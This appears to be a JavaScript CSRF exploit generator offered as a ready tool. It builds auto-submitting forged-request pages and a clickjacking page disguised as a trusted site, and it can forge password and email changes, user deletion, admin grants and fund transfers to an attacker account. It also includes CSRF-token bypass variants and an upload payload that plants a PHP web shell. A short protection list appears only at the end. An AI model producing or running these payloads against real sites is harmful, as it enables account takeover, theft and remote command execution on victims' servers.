/**
 * REAL CSRF Exploit Generator
 */

class CSRFTester {
    constructor() {
        this.templates = [];
        this.loadTemplates();
    }
    
    loadTemplates() {
        this.templates = [
            {
                name: 'Basic Form POST',
                method: 'POST',
                template: `
<form id="csrfForm" action="{{action}}" method="POST">
    {{#each params}}
    <input type="hidden" name="{{name}}" value="{{value}}">
    {{/each}}
</form>
<script>
    document.getElementById('csrfForm').submit();
</script>
                `
            },
            {
                name: 'AJAX POST',
                method: 'POST',
                template: `
<script>
    const params = {{paramsJSON}};
    fetch('{{action}}', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/x-www-form-urlencoded',
        },
        body: new URLSearchParams(params),
        credentials: 'include'
    });
</script>
                `
            },
            {
                name: 'Image GET',
                method: 'GET',
                template: `
<img src="{{action}}?{{queryString}}" style="display:none;">
                `
            },
            {
                name: 'Script GET',
                method: 'GET',
                template: `
<script src="{{action}}?{{queryString}}"></script>
                `
            },
            {
                name: 'Iframe Form',
                method: 'POST',
                template: `
<iframe name="csrfFrame" style="display:none;"></iframe>
<form action="{{action}}" method="POST" target="csrfFrame">
    {{#each params}}
    <input type="hidden" name="{{name}}" value="{{value}}">
    {{/each}}
    <input type="submit" value="Submit">
</form>
<script>
    document.forms[0].submit();
</script>
                `
            },
            {
                name: 'JSON POST',
                method: 'POST',
                template: `
<script>
    const data = {{paramsJSON}};
    fetch('{{action}}', {
        method: 'POST',
        headers: {
            'Content-Type': 'application/json',
        },
        body: JSON.stringify(data),
        credentials: 'include'
    });
</script>
                `
            }
        ];
    }
    
    generateExploit(action, method, params) {
        const template = this.templates.find(t => t.method === method) || this.templates[0];
        
        let exploit = template.template;
        
        // Replace placeholders
        exploit = exploit.replace('{{action}}', action);
        
        if (method === 'GET') {
            const queryString = new URLSearchParams(params).toString();
            exploit = exploit.replace('{{queryString}}', queryString);
        } else {
            // Generate hidden inputs for form
            let inputs = '';
            for (const [name, value] of Object.entries(params)) {
                inputs += `<input type="hidden" name="${name}" value="${value}">\n    `;
            }
            exploit = exploit.replace('{{#each params}}\n    <input type="hidden" name="{{name}}" value="{{value}}">\n    {{/each}}', inputs);
            
            // Add JSON version if needed
            if (exploit.includes('{{paramsJSON}}')) {
                exploit = exploit.replace('{{paramsJSON}}', JSON.stringify(params));
            }
        }
        
        return {
            name: template.name,
            method: method,
            exploit: exploit,
            shortened: exploit.length > 500 ? exploit.substring(0, 500) + '...' : exploit
        };
    }
    
    generateAllExploits(action, params, methods = ['GET', 'POST']) {
        const exploits = [];
        
        for (let method of methods) {
            exploits.push(this.generateExploit(action, method, params));
        }
        
        return exploits;
    }
    
    async testCSRF(url, action, params) {
        const results = [];
        
        // Test without Origin header
        const test1 = await this.testRequest(url, action, params, {});
        
        // Test with fake Origin
        const test2 = await this.testRequest(url, action, params, {
            'Origin': 'http://evil.com'
        });
        
        // Test with Referer
        const test3 = await this.testRequest(url, action, params, {
            'Referer': 'http://evil.com'
        });
        
        results.push({
            test: 'No Origin/Referer',
            result: test1,
            vulnerable: test1.success
        });
        
        results.push({
            test: 'Fake Origin',
            result: test2,
            vulnerable: test2.success
        });
        
        results.push({
            test: 'Fake Referer',
            result: test3,
            vulnerable: test3.success
        });
        
        return results;
    }
    
    async testRequest(baseUrl, action, params, headers = {}) {
        try {
            const url = new URL(action, baseUrl);
            
            // Convert params to FormData for POST or URLSearchParams for GET
            const formData = new FormData();
            for (const [key, value] of Object.entries(params)) {
                formData.append(key, value);
            }
            
            const options = {
                method: 'POST',
                body: formData,
                credentials: 'include', // Include cookies
                headers: headers
            };
            
            const response = await fetch(url.toString(), options);
            const text = await response.text();
            
            return {
                success: true,
                status: response.status,
                statusText: response.statusText,
                length: text.length,
                preview: text.substring(0, 200)
            };
            
        } catch (error) {
            return {
                success: false,
                error: error.message
            };
        }
    }
    
    generateClickjacking(action, params) {
        const clickjack = `
<!DOCTYPE html>
<html>
<head>
    <title>Trusted Page</title>
    <style>
        #overlay {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0.5;
            z-index: 1000;
            background: transparent;
        }
        #hiddenForm {
            position: absolute;
            top: 100px;
            left: 100px;
            opacity: 0;
            z-index: 1001;
        }
    </style>
</head>
<body>
    <h1>Welcome to Trusted Site</h1>
    <p>Click anywhere to continue...</p>
    
    <div id="overlay"></div>
    
    <form id="hiddenForm" action="${action}" method="POST">
        ${Object.entries(params).map(([key, value]) => 
            `<input type="hidden" name="${key}" value="${value}">`
        ).join('\n        ')}
        <input type="submit" value="Submit">
    </form>
    
    <script>
        document.addEventListener('click', function(e) {
            document.getElementById('hiddenForm').submit();
        }, { once: true });
    </script>
</body>
</html>
        `.trim();
        
        return {
            type: 'Clickjacking',
            description: 'Transparent overlay that submits form on any click',
            code: clickjack
        };
    }
    
    generateStoredCSRF(action, params) {
        const stored = `
<script>
    // This script can be stored in comments, profiles, etc.
    window.onload = function() {
        const form = document.createElement('form');
        form.method = 'POST';
        form.action = '${action}';
        form.style.display = 'none';
        
        ${Object.entries(params).map(([key, value]) => 
            `const input${key} = document.createElement('input');
        input${key}.name = '${key}';
        input${key}.value = '${value}';
        form.appendChild(input${key});`
        ).join('\n        ')}
        
        document.body.appendChild(form);
        form.submit();
    };
</script>
        `.trim();
        
        return {
            type: 'Stored CSRF',
            description: 'Auto-submits form when page loads',
            code: stored
        };
    }
    
    generateCSRFWithFileUpload(action) {
        const uploadCSRF = `
<form id="uploadForm" action="${action}" method="POST" enctype="multipart/form-data">
    <input type="hidden" name="user_id" value="1">
    <input type="hidden" name="action" value="update_avatar">
    <input type="file" name="avatar" id="fileInput" style="display:none;">
</form>

<script>
    // Create a fake file
    const blob = new Blob(['<?php system($_GET["cmd"]); ?>'], {type: 'text/php'});
    const file = new File([blob], 'shell.php', {type: 'text/php'});
    
    // Create a DataTransfer to set the file
    const dataTransfer = new DataTransfer();
    dataTransfer.items.add(file);
    
    // Set the file to the input
    document.getElementById('fileInput').files = dataTransfer.files;
    
    // Submit the form
    setTimeout(() => {
        document.getElementById('uploadForm').submit();
    }, 1000);
</script>
        `.trim();
        
        return {
            type: 'File Upload CSRF',
            description: 'Uploads a malicious file via CSRF',
            code: uploadCSRF
        };
    }
    
    generatePasswordChangeCSRF(username, newPassword) {
        const payload = {
            username: username,
            new_password: newPassword,
            confirm_password: newPassword,
            submit: 'Change Password'
        };
        
        return this.generateExploit('/changepassword.php', 'POST', payload);
    }
    
    generateEmailChangeCSRF(email) {
        const payload = {
            new_email: email,
            confirm_email: email,
            submit: 'Update Email'
        };
        
        return this.generateExploit('/changeemail.php', 'POST', payload);
    }
    
    generateAdminActionCSRF(action, userId) {
        const payloads = {
            'delete_user': {
                user_id: userId,
                action: 'delete',
                confirm: 'yes'
            },
            'make_admin': {
                user_id: userId,
                role: 'admin',
                action: 'update_role'
            },
            'transfer_funds': {
                from: userId,
                to: 'attacker_account',
                amount: '1000',
                currency: 'USD'
            }
        };
        
        const payload = payloads[action] || { action: action, user_id: userId };
        
        return this.generateAllExploits('/admin/actions.php', payload);
    }
    
    generateCSRFTokenBypass(action, params, tokenName = 'csrf_token') {
        // Techniques to bypass CSRF tokens
        const techniques = [
            {
                name: 'Remove token parameter',
                description: 'Simply omit the CSRF token',
                exploit: this.generateExploit(action, 'POST', params)
            },
            {
                name: 'Empty token value',
                description: 'Set token to empty string',
                exploit: this.generateExploit(action, 'POST', {
                    ...params,
                    [tokenName]: ''
                })
            },
            {
                name: 'Predictable token',
                description: 'Try common token values',
                exploit: this.generateExploit(action, 'POST', {
                    ...params,
                    [tokenName]: '123456'
                })
            },
            {
                name: 'Same token reuse',
                description: 'If you have a valid token, reuse it',
                exploit: this.generateExploit(action, 'POST', {
                    ...params,
                    [tokenName]: '{{VALID_TOKEN}}'
                })
            }
        ];
        
        return techniques;
    }
    
    async autoDiscoverForms(url) {
        try {
            const response = await fetch(url);
            const html = await response.text();
            
            const forms = [];
            
            // Parse forms from HTML
            const formRegex = /<form[^>]*>(.*?)<\/form>/gis;
            let formMatch;
            
            while ((formMatch = formRegex.exec(html)) !== null) {
                const formHTML = formMatch[0];
                
                // Extract form attributes
                const actionMatch = formHTML.match(/action=["']([^"']+)["']/i);
                const methodMatch = formHTML.match(/method=["']([^"']+)["']/i);
                
                // Extract input fields
                const inputRegex = /<input[^>]*name=["']([^"']+)["'][^>]*>/gi;
                const inputs = [];
                let inputMatch;
                
                while ((inputMatch = inputRegex.exec(formHTML)) !== null) {
                    // Get input type and value
                    const typeMatch = inputMatch[0].match(/type=["']([^"']+)["']/i);
                    const valueMatch = inputMatch[0].match(/value=["']([^"']+)["']/i);
                    
                    inputs.push({
                        name: inputMatch[1],
                        type: typeMatch ? typeMatch[1] : 'text',
                        value: valueMatch ? valueMatch[1] : '',
                        possibleValues: this.guessPossibleValues(inputMatch[1])
                    });
                }
                
                forms.push({
                    html: formHTML.substring(0, 200) + '...',
                    action: actionMatch ? actionMatch[1] : url,
                    method: methodMatch ? methodMatch[1] : 'POST',
                    inputs: inputs,
                    potentialCSRF: this.analyzeFormForCSRF(formHTML)
                });
            }
            
            return forms;
            
        } catch (error) {
            return {
                error: error.message,
                forms: []
            };
        }
    }
    
    guessPossibleValues(inputName) {
        const commonValues = {
            'username': ['admin', 'user', 'test'],
            'email': ['admin@example.com', 'test@test.com'],
            'password': ['password', '123456', 'admin123'],
            'role': ['admin', 'user', 'moderator'],
            'status': ['active', 'inactive', 'pending'],
            'action': ['delete', 'update', 'create'],
            'submit': ['Submit', 'Save', 'Update']
        };
        
        for (const [key, values] of Object.entries(commonValues)) {
            if (inputName.toLowerCase().includes(key)) {
                return values;
            }
        }
        
        return [];
    }
    
    analyzeFormForCSRF(formHTML) {
        const analysis = {
            hasToken: false,
            tokenNames: [],
            protectionLevel: 'None'
        };
        
        // Check for CSRF tokens
        const tokenPatterns = [
            /csrf/i,
            /token/i,
            /nonce/i,
            /authenticity/i,
            /_token/i
        ];
        
        // Check input names
        const inputNameRegex = /name=["']([^"']+)["']/gi;
        let inputMatch;
        
        while ((inputMatch = inputNameRegex.exec(formHTML)) !== null) {
            const name = inputMatch[1];
            
            for (const pattern of tokenPatterns) {
                if (pattern.test(name)) {
                    analysis.hasToken = true;
                    analysis.tokenNames.push(name);
                    break;
                }
            }
        }
        
        // Determine protection level
        if (analysis.hasToken) {
            analysis.protectionLevel = 'Token Present';
        } else {
            analysis.protectionLevel = 'No Protection';
        }
        
        return analysis;
    }
    
    generateReport(targetUrl) {
        return {
            timestamp: new Date().toISOString(),
            target: targetUrl,
            vulnerabilities: [
                'CSRF on form submissions',
                'Lack of CSRF tokens',
                'Predictable tokens',
                'Missing SameSite cookies'
            ],
            exploitation: {
                passwordChange: this.generatePasswordChangeCSRF('admin', 'hacked123'),
                emailChange: this.generateEmailChangeCSRF('attacker@evil.com'),
                adminActions: this.generateAdminActionCSRF('delete_user', '1')
            },
            protection: [
                'Implement CSRF tokens',
                'Use SameSite cookie attribute',
                'Check Origin/Referer headers',
                'Require re-authentication for sensitive actions',
                'Use double-submit cookie pattern'
            ],
            testingMethodology: `
1. Identify forms and actions
2. Check for CSRF tokens
3. Test token bypass techniques
4. Generate exploit payloads
5. Test in controlled environment
            `.trim()
        };
    }
}

window.CSRFTester = CSRFTester;